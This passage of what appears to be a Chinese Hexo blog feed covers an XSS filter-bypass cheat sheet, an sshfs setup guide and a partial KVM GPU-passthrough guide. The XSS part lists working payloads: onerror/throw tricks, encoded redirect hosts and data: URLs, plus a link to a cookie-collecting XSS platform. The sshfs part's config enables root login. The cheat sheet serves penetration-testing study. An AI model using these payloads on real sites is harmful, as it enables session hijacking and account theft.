href="#3-2-4-过滤括号" class="headerlink" title="3.2.4 过滤括号"></a>3.2.4 过滤括号</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"># 使用 throw 绕过<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">onerror=alert;<span class="hljs-keyword">throw</span> <span class="hljs-number">1337</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>&gt; onerror在每次javascript执行异常时都会被激活，调用指定的处理程序，并且throw语句可创建一个发送到onerror处的包含表达式的自定义异常。因为throw是一个语句，在和onerror配合使用时需要用分号隔离，避免被包含。<br><br># 使用``代替<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">alert<span class="hljs-string">`1`</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br># HTML编码绕过<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">alert<span class="hljs-symbol">&amp;#x28;</span>1<span class="hljs-symbol">&amp;#x29;</span></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="3-2-5-过滤URL地址"><a href="#3-2-5-过滤URL地址" class="headerlink" title="3.2.5 过滤URL地址"></a>3.2.5 过滤URL地址</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs html"># 使用URL编码<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">document.location</span>=`<span class="hljs-attr">http:</span>//%<span class="hljs-attr">77</span>%<span class="hljs-attr">77</span>%<span class="hljs-attr">77</span>%<span class="hljs-attr">2e</span>%<span class="hljs-attr">62</span>%<span class="hljs-attr">61</span>%<span class="hljs-attr">69</span>%<span class="hljs-attr">64</span>%<span class="hljs-attr">75</span>%<span class="hljs-attr">2e</span>%<span class="hljs-attr">63</span>%<span class="hljs-attr">6f</span>%<span class="hljs-attr">6d</span>/`&gt;</span><br><br># 使用IP<br># 使用进制转换<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">document.location</span>=`<span class="hljs-attr">http:</span>//<span class="hljs-attr">2130706433</span>/`&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">document.location</span>=`<span class="hljs-attr">http:</span>//<span class="hljs-attr">0177.0.0.01</span>/`&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">document.location</span>=`<span class="hljs-attr">http:</span>//<span class="hljs-attr">0x7f.0x0.0x0.0x1</span>/`&gt;</span><br><br># html标签中用//可以代替http://<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">document.location</span>=`//<span class="hljs-attr">www.baidu.com</span>`&gt;</span><br><br># 使用\\<br>但是要注意在windows下\本身就有特殊用途，是一个 path 的写法，所以\在Windows下是file协议，在linux下才会是当前域的协议<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">document.location</span>=`\\<span class="hljs-attr">www.baidu.com</span>`&gt;</span><br><br># 使用中文句号代替英文点号<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;document.location=`http://www。baidu。com`&quot;</span>&gt;</span><br><br># 利用data类型的url代替http://<br>data:text,alert()<br></code></pre></td></tr></table></figure><h1 id="4-利用"><a href="#4-利用" class="headerlink" title="4 利用"></a>4 利用</h1><p><a href="https://xss.pt/xss.php?do=login">XSS plamform</a></p><ul><li><p>cookie editor 浏览器插件</p></li><li><p>burp 更换 http 头部的 cookie、useragent 字段</p></li></ul><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://johnfrod.top/%e5%ae%89%e5%85%a8/xss%e6%80%bb%e7%bb%93/">xss总结</a><br><a href="https://johnfrod.top/%e5%ae%89%e5%85%a8/xss%e7%bc%96%e7%a0%81%e5%89%96%e6%9e%90/">xss编码剖析</a><br><a href="https://saucer-man.com/information_security/103.html">探索XSS利用编码绕过的原理</a></p>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
      <category>PenTest</category>
      
      <category>经典漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Security</tag>
      
      <tag>PenTest</tag>
      
      <tag>经典漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sshfs配置</title>
    <link href="/2022/07/20/2022-07-20.sshfs/"/>
    <url>/2022/07/20/2022-07-20.sshfs/</url>
    
    <content type="html"><![CDATA[<ul><li><a href="#1-server-%E7%AB%AF%E9%85%8D%E7%BD%AE">1 server 端配置</a><ul><li><a href="#11-linux-%E9%85%8D%E7%BD%AE">1.1 linux 配置</a></li><li><a href="#12-windows-%E9%85%8D%E7%BD%AE">1.2 windows 配置</a></li></ul></li><li><a href="#2-client-%E7%AB%AF">2 client 端</a><ul><li><a href="#21-linux-%E6%8C%82%E8%BD%BD">2.1 linux 挂载</a></li><li><a href="#22-windows-%E6%8C%82%E8%BD%BD">2.2 windows 挂载</a></li></ul></li></ul><h1 id="1-server-端配置"><a href="#1-server-端配置" class="headerlink" title="1 server 端配置"></a>1 server 端配置</h1><p>windows 操作系统需要安装可选功能, OpenSSH服务器。</p><p>配置 <code>server</code> 端 <code>/etc/ssh/sshd_config</code> 或 <code>C:\ProgramData\ssh\sshd_config</code> 文件</p><h2 id="1-1-linux-配置"><a href="#1-1-linux-配置" class="headerlink" title="1.1 linux 配置"></a>1.1 linux 配置</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">PermitRootLogin <span class="hljs-built_in">yes</span><br>PubkeyAuthentication <span class="hljs-built_in">yes</span><br>PasswordAuthentication no<br><span class="hljs-comment"># 防止ssh超时断开连接，开启下列两项</span><br>ClientAliveInterval 120<br>ClientAliveCountMax 3<br></code></pre></td></tr></table></figure><h2 id="1-2-windows-配置"><a href="#1-2-windows-配置" class="headerlink" title="1.2 windows 配置"></a>1.2 windows 配置</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># This is the sshd server system-wide configuration file.  See</span><br><span class="hljs-comment"># sshd_config(5) for more information.</span><br><br><span class="hljs-comment"># The strategy used for options in the default sshd_config shipped with</span><br><span class="hljs-comment"># OpenSSH is to specify options with their default value where</span><br><span class="hljs-comment"># possible, but leave them commented.  Uncommented options override the</span><br><span class="hljs-comment"># default value.</span><br><br><span class="hljs-comment">#Port 22</span><br><span class="hljs-comment">#AddressFamily any</span><br><span class="hljs-comment">#ListenAddress 0.0.0.0</span><br><span class="hljs-comment">#ListenAddress ::</span><br><br><span class="hljs-comment">#HostKey __PROGRAMDATA__/ssh/ssh_host_rsa_key</span><br><span class="hljs-comment">#HostKey __PROGRAMDATA__/ssh/ssh_host_dsa_key</span><br><span class="hljs-comment">#HostKey __PROGRAMDATA__/ssh/ssh_host_ecdsa_key</span><br><span class="hljs-comment">#HostKey __PROGRAMDATA__/ssh/ssh_host_ed25519_key</span><br><br><span class="hljs-comment"># Ciphers and keying</span><br><span class="hljs-comment">#RekeyLimit default none</span><br><br><span class="hljs-comment"># Logging</span><br><span class="hljs-comment">#SyslogFacility AUTH</span><br><span class="hljs-comment">#LogLevel INFO</span><br><br><span class="hljs-comment"># Authentication:</span><br><br><span class="hljs-comment">#LoginGraceTime 2m</span><br><span class="hljs-comment">#PermitRootLogin prohibit-password</span><br>PermitRootLogin <span class="hljs-built_in">yes</span><br><span class="hljs-comment">#StrictModes yes</span><br><span class="hljs-comment">#MaxAuthTries 6</span><br><span class="hljs-comment">#MaxSessions 10</span><br><br>PubkeyAuthentication <span class="hljs-built_in">yes</span><br><br><span class="hljs-comment"># The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2</span><br><span class="hljs-comment"># but this is overridden so installations will only check .ssh/authorized_keys</span><br>AuthorizedKeysFile.ssh/authorized_keys<br><br><span class="hljs-comment">#AuthorizedPrincipalsFile none</span><br><br><span class="hljs-comment"># For this to work you will also need host keys in %programData%/ssh/ssh_known_hosts</span><br><span class="hljs-comment">#HostbasedAuthentication no</span><br><span class="hljs-comment"># Change to yes if you don&#x27;t trust ~/.ssh/known_hosts for</span><br><span class="hljs-comment"># HostbasedAuthentication</span><br><span class="hljs-comment">#IgnoreUserKnownHosts no</span><br><span class="hljs-comment"># Don&#x27;t read the user&#x27;s ~/.rhosts and ~/.shosts files</span><br><span class="hljs-comment">#IgnoreRhosts yes</span><br><br><span class="hljs-comment"># To disable tunneled clear text passwords, change to no here!</span><br>PasswordAuthentication no<br><span class="hljs-comment">#PermitEmptyPasswords no</span><br><br><span class="hljs-comment"># GSSAPI options</span><br><span class="hljs-comment">#GSSAPIAuthentication no</span><br><br><span class="hljs-comment">#AllowAgentForwarding yes</span><br><span class="hljs-comment">#AllowTcpForwarding yes</span><br><span class="hljs-comment">#GatewayPorts no</span><br><span class="hljs-comment">#PermitTTY yes</span><br><span class="hljs-comment">#PrintMotd yes</span><br><span class="hljs-comment">#PrintLastLog yes</span><br><span class="hljs-comment">#TCPKeepAlive yes</span><br><span class="hljs-comment">#UseLogin no</span><br><span class="hljs-comment">#PermitUserEnvironment no</span><br>ClientAliveInterval 120<br>ClientAliveCountMax 3<br><span class="hljs-comment">#UseDNS no</span><br><span class="hljs-comment">#PidFile /var/run/sshd.pid</span><br><span class="hljs-comment">#MaxStartups 10:30:100</span><br><span class="hljs-comment">#PermitTunnel no</span><br><span class="hljs-comment">#ChrootDirectory none</span><br><span class="hljs-comment">#VersionAddendum none</span><br><br><span class="hljs-comment"># no default banner path</span><br><span class="hljs-comment">#Banner none</span><br><br><span class="hljs-comment"># override default of no subsystems</span><br>Subsystemsftpsftp-server.exe<br><br><span class="hljs-comment"># Example of overriding settings on a per-user basis</span><br><span class="hljs-comment">#Match User anoncvs</span><br><span class="hljs-comment">#AllowTcpForwarding no</span><br><span class="hljs-comment">#PermitTTY no</span><br><span class="hljs-comment">#ForceCommand cvs server</span><br><br><span class="hljs-comment">#Match Group administrators</span><br><span class="hljs-comment">#       AuthorizedKeysFile __PROGRAMDATA__/ssh/administrators_authorized_keys</span><br></code></pre></td></tr></table></figure><h1 id="2-client-端"><a href="#2-client-端" class="headerlink" title="2 client 端"></a>2 client 端</h1><h2 id="2-1-linux-挂载"><a href="#2-1-linux-挂载" class="headerlink" title="2.1 linux 挂载"></a>2.1 linux 挂载</h2><p>挂载命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo sshfs 用户@ip:server端路径 client端挂载路径 -o reconnect -o cache=<span class="hljs-built_in">yes</span> -o port=ssh端口号 -o <span class="hljs-built_in">users</span> -o allow_other<br></code></pre></td></tr></table></figure><p>fstab 文件写法,以D盘为例:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">用户@ip:serverip:D://home/worisursshfsdefaults,_netdev,<span class="hljs-built_in">umask</span>=0022,uid=1001,gid=998,allow_other0 0<br></code></pre></td></tr></table></figure><h2 id="2-2-windows-挂载"><a href="#2-2-windows-挂载" class="headerlink" title="2.2 windows 挂载"></a>2.2 windows 挂载</h2><p>安装以下工具：</p><p><a href="https://github.com/billziss-gh/sshfs-win/releases">sshfs-win</a><br><a href="https://github.com/billziss-gh/winfsp/releases">winfsp</a><br><a href="https://github.com/evsar3/sshfs-win-manager/releases">SSHFS-Win Manager</a></p><p>配置文件位置 <code>C:\Users\用户\AppData\Roaming\sshfs-win-manager\vuex.json</code> </p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs wren">&#123;<br><span class="hljs-string">&quot;state&quot;</span>: &#123;<br><span class="hljs-string">&quot;Data&quot;</span>: &#123;<br><span class="hljs-string">&quot;connections&quot;</span>: [<br>&#123;<br><span class="hljs-string">&quot;advanced&quot;</span>: &#123;<br><span class="hljs-string">&quot;connectOnStartup&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;customCmdlOptions&quot;</span>: [],<br><span class="hljs-string">&quot;customCmdlOptionsEnabled&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;reconnect&quot;</span>: <span class="hljs-literal">false</span><br>&#125;,<br><span class="hljs-string">&quot;authType&quot;</span>: <span class="hljs-string">&quot;key-file&quot;</span>,<br><span class="hljs-string">&quot;folder&quot;</span>: <span class="hljs-string">&quot;/0.main&quot;</span>,<br><span class="hljs-string">&quot;host&quot;</span>: <span class="hljs-string">&quot;ip&quot;</span>,<br><span class="hljs-string">&quot;key&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br><span class="hljs-string">&quot;keyFile&quot;</span>: <span class="hljs-string">&quot;C:<span class="hljs-char escape_">\\</span>Users<span class="hljs-char escape_">\\</span>用户<span class="hljs-char escape_">\\</span>.ssh<span class="hljs-char escape_">\\</span>id_rsa&quot;</span>,<br><span class="hljs-string">&quot;mountPoint&quot;</span>: <span class="hljs-string">&quot;A:&quot;</span>,<br><span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;worisur&quot;</span>,<br><span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br><span class="hljs-string">&quot;pid&quot;</span>: <span class="hljs-number">4624</span>,<br><span class="hljs-string">&quot;port&quot;</span>: <span class="hljs-number">50011</span>,<br><span class="hljs-string">&quot;preferredMountPoint&quot;</span>: <span class="hljs-literal">null</span>,<br><span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;connected&quot;</span>,<br><span class="hljs-string">&quot;user&quot;</span>: <span class="hljs-string">&quot;用户&quot;</span>,<br><span class="hljs-string">&quot;uuid&quot;</span>: <span class="hljs-string">&quot;63308430-7dbf-4c8a-9fe5-a6c4bd28b595&quot;</span><br>&#125;<br>]<br>&#125;,<br><span class="hljs-string">&quot;Settings&quot;</span>: &#123;<br><span class="hljs-string">&quot;settings&quot;</span>: &#123;<br><span class="hljs-string">&quot;sshfsBinary&quot;</span>: <span class="hljs-string">&quot;C:<span class="hljs-char escape_">\\</span>Atools<span class="hljs-char escape_">\\</span>network<span class="hljs-char escape_">\\</span>sshfs<span class="hljs-char escape_">\\</span>sshfs-win<span class="hljs-char escape_">\\</span>bin<span class="hljs-char escape_">\\</span>sshfs.exe&quot;</span>,<br><span class="hljs-string">&quot;startupWithOS&quot;</span>: <span class="hljs-literal">true</span>,<br><span class="hljs-string">&quot;displayTrayMessageOnClose&quot;</span>: <span class="hljs-literal">true</span>,<br><span class="hljs-string">&quot;processTrackTimeout&quot;</span>: <span class="hljs-number">15</span>,<br><span class="hljs-string">&quot;showDebugPanel&quot;</span>: <span class="hljs-literal">false</span><br>&#125;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ssh</category>
      
      <category>sshfs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ssh</tag>
      
      <tag>sshfs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>kvm 显卡直通(单显卡)</title>
    <link href="/2022/07/14/2022-07-14.kvm%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/"/>
    <url>/2022/07/14/2022-07-14.kvm%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/</url>
    
    <content type="html"><![CDATA[<ul><li><a href="#1-%E5%AE%89%E8%A3%85">1 安装</a></li><li><a href="#2-%E9%85%8D%E7%BD%AE">2 配置</a><ul><li><a href="#21-%E6%A1%A5%E6%8E%A5">2.1 桥接</a></li><li><a href="#22-iommu">2.2 iommu</a></li><li><a href="#23-%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%E6%B7%BB%E5%8A%A0">2.3 内核模块添加</a></li><li><a href="#24-hook-%E8%84%9A%E6%9C%AC">2.4 hook 脚本</a></li><li><a href="#25-qemu-%E9%85%8D%E7%BD%AE">2.5 QEMU 配置</a></li></ul></li><li><a href="#3-%E7%9B%B4%E9%80%9A">3 直通</a><ul><li><a href="#31-%E5%88%9B%E5%BB%BA%E4%B8%8D%E7%9B%B4%E9%80%9A%E7%9A%84%E8%99%9A%E6%8B%9F%E6%9C%BA">3.1 创建不直通的虚拟机</a></li><li><a href="#32-vbios">3.2 vbios</a></li><li><a href="#33-%E6%B7%BB%E5%8A%A0%E7%9B%B4%E9%80%9A%E8%AE%BE%E5%A4%87">3.3 添加直通设备</a></li></ul></li><li><a href="#4-%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3">4 问题解决</a><ul><li><a href="#41-%E8%BD%AF%E4%BB%B6%E4%B8%8D%E8%83%BD%E8%BF%90%E8%A1%8C%E5%9C%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8Asorry-this-program-cannot-run-under-a-virtual-machine">4.1 软件不能运行在虚拟机上(Sorry, this program cannot run under a virtual machine)</a></li><li><a href="#42-%E9%BB%91%E5%B1%8Fucsi_cgg-1-0008-ucsi_handle_connector_change-get_connector_status-failed">4.2 黑屏(ucsi_cgg 1-0008: ucsi_handle_connector_change: GET_CONNECTOR_STATUS failed)</a></li><li><a href="#42-docker-%E6%A1%A5%E6%8E%A5%E5%8D%A0%E7%94%A8%E7%89%A9%E7%90%86%E7%BD%91%E5%8D%A1%E5%AF%BC%E8%87%B4%E7%BD%91%E7%BB%9C%E4%B8%8D%E9%80%9A%E7%9A%84%E6%83%85%E5%86%B5">4.2 docker 桥接占用物理网卡导致网络不通的情况</a></li></ul></li></ul><h1 id="1-安装"><a href="#1-安装" class="headerlink" title="1 安装"></a>1 安装</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">app-emulation/qemu<br>app-emulation/libvirt<br>app-emulation/virt-manager<br>net-misc/bridge-utils<br>sys-firmware/edk2-ovmf<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">usermod -a -G libvirt miloo<br>usermod -a -G kvm miloo <br>systemctl <span class="hljs-built_in">enable</span> libvirtd<br>systemctl <span class="hljs-built_in">enable</span> virtlogd-admin.socket<br></code></pre></td></tr></table></figure><h1 id="2-配置"><a href="#2-配置" class="headerlink" title="2 配置"></a>2 配置</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">worisur ~ <span class="hljs-comment"># neofetch</span><br>         -/oyddmdhs+:.                root@worisur<br>     -odNMMMMMMMMNNmhy+-`             ------------<br>   -yNMMMMMMMMMMMNNNmmdhy+-           OS: Gentoo Base System release 2.8 x86_64<br> `omMMMMMMMMMMMMNmdmmmmddhhy/`        Kernel: 5.15.52-gentoo-dist<br> omMMMMMMMMMMMNhhyyyohmdddhhhdo`      Uptime: 19 hours, 43 mins<br>.ydMMMMMMMMMMdhs++so/smdddhhhhdm+`    Packages: 975 (emerge)<br> oyhdmNMMMMMMMNdyooydmddddhhhhyhNd.   Shell: bash 5.1.16<br>  :oyhhdNNMMMMMMMNNNmmdddhhhhhyymMh   Terminal: /dev/pts/0<br>    .:+sydNMMMMMNNNmmmdddhhhhhhmMmy   CPU: AMD Ryzen 9 5900X (24) @ 3.700GHz<br>       /mMMMMMMNNNmmmdddhhhhhmMNhs:   GPU: AMD ATI Radeon RX 6800/6800 XT / 6900 XT<br>    `oNMMMMMMMNNNmmmddddhhdmMNhs+`    Memory: 33068MiB / 64220MiB<br>  `sNMMMMMMMMNNNmmmdddddmNMmhs/.<br> /NMMMMMMMMNNNNmmmdddmNMNdso:`<br>+MMMMMMMNNNNNmmmmdmNMNdso/-<br>yMMNNNNNNNmmmmmNNMmhs+/-`<br>/hMMNNNNNNNNMNdhs++/-`<br>`/ohdmmddhys+++/:.`<br>  `-//////:--.<br></code></pre></td></tr></table></figure><h2 id="2-1-桥接"><a href="#2-1-桥接" class="headerlink" title="2.1 桥接"></a>2.1 桥接</h2><p><a href="https://blog.51cto.com/u_3823536/2547591">无线网卡看这里</a></p><p><a href="https://support.huaweicloud.com/dpmg-kunpengwebs/kunpengtomee_04_0008.html">brctl配置看这里</a></p><ul><li>我的做法:</li></ul><p>NetworkManager 直接使用 <code>nmtui</code> 将需要桥接的网卡加进新建的网桥(并将该网卡的mac地址配置给网桥),然后给网桥配置静态的地址(配置方式和普通网卡没区别),设置开机启动</p><h2 id="2-2-iommu"><a href="#2-2-iommu" class="headerlink" title="2.2 iommu"></a>2.2 iommu</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/default/grub<br><span class="hljs-comment"># 添加如下行</span><br><span class="hljs-comment"># AMD处理器(根据BIOS设置默认已启用？)：amd_iommu=on</span><br><span class="hljs-comment"># 可视情况添加（修复或导致黑屏）：iommu=pt</span><br>GRUB_CMDLINE_LINUX_DEFAULT=<span class="hljs-string">&quot;amd_iommu=on iommu=pt&quot;</span><br><br></code></pre></td></tr></table></figure><p>重启后,看看启动日志检查一下IOMMU是否已启用,使用超级用户权限运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs bash">worisur ~ <span class="hljs-comment"># dmesg | grep -e DMAR -e iommu</span><br>[    0.000000] Command line: BOOT_IMAGE=/vmlinuz-5.15.52-gentoo-dist root=UUID=c9ffa84e-ef8f-45f0-b508-18d12102fbbc ro amd_iommu=on iommu=pt<br>[    0.067146] Kernel <span class="hljs-built_in">command</span> line: BOOT_IMAGE=/vmlinuz-5.15.52-gentoo-dist root=UUID=c9ffa84e-ef8f-45f0-b508-18d12102fbbc ro amd_iommu=on iommu=pt<br>[    0.531545] iommu: Default domain <span class="hljs-built_in">type</span>: Passthrough (<span class="hljs-built_in">set</span> via kernel <span class="hljs-built_in">command</span> line)<br>[    0.547978] pci 0000:00:01.0: Adding to iommu group 0<br>[    0.547984] pci 0000:00:01.1: Adding to iommu group 1<br>[    0.547991] pci 0000:00:01.2: Adding to iommu group 2<br>[    0.547997] pci 0000:00:02.0: Adding to iommu group 3<br>[    0.548004] pci 0000:00:03.0: Adding to iommu group 4<br>[    0.548010] pci 0000:00:03.1: Adding to iommu group 5<br>[    0.548016] pci 0000:00:04.0: Adding to iommu group 6<br>[    0.548022] pci 0000:00:05.0: Adding to iommu group 7<br>[    0.548029] pci 0000:00:07.0: Adding to iommu group 8<br>[    0.548034] pci 0000:00:07.1: Adding to iommu group 9<br>[    0.548040] pci 0000:00:08.0: Adding to iommu group 10<br>[    0.548046] pci 0000:00:08.1: Adding to iommu group 11<br>[    0.548054] pci 0000:00:14.0: Adding to iommu group 12<br>[    0.548059] pci 0000:00:14.3: Adding to iommu group 12<br>[    0.548075] pci 0000:00:18.0: Adding to iommu group 13<br>[    0.548079] pci 0000:00:18.1: Adding to iommu group 13<br>[    0.548084] pci 0000:00:18.2: Adding to iommu group 13<br>[    0.548089] pci 0000:00:18.3: Adding to iommu group 13<br>[    0.548093] pci 0000:00:18.4: Adding to iommu group 13<br>[    0.548098] pci 0000:00:18.5: Adding to iommu group 13<br>[    0.548102] pci 0000:00:18.6: Adding to iommu group 13<br>[    0.548107] pci 0000:00:18.7: Adding to iommu group 13<br>[    0.548112] pci 0000:01:00.0: Adding to iommu group 14<br>[    0.548122] pci 